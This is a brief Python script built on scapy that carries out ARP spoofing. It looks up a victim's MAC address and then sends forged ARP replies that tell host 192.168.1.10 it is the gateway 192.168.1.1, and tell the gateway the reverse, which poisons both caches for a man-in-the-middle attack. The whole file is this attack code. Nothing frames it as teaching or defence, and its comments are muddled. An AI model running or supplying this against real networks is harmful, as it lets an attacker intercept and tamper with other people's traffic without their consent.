import scapy.all as scapy


def get_mac(ip):
    arp_req = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_broadcast = broadcast / arp_req
    answered_list = scapy.srp(arp_req_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc
 
    

def spoof(target_ip , spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2 , pdst= target_ip, hwdst= target_mac , psrc=spoof_ip)
    scapy.send(packet)


spoof("192.168.1.10", "192.168.1.1") #tell route (vimtc) tell vimtc (route)
spoof("192.168.1.1", "192.168.1.10") #tell tell vimtc (route) route (vimtc) 